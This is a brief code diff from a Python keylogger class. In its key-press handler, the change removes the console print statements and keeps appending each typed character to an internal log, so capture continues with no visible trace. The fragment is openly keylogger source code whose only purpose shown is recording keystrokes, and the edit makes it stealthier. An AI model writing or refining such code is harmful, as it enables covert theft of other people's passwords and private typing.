@@ -43,11 +43,9 @@ class Keylogger:
 
     def on_press(self, key):
         try:
-            print('alphanumeric key {0} pressed'.format(key.char))
             self.log += '{0}'.format(key.char)
           
         except AttributeError:
-            print('special key {0} pressed'.format(key))
             if key == Key.backspace:
                 self.log = self.log[:-1]
             elif key == Key.space:
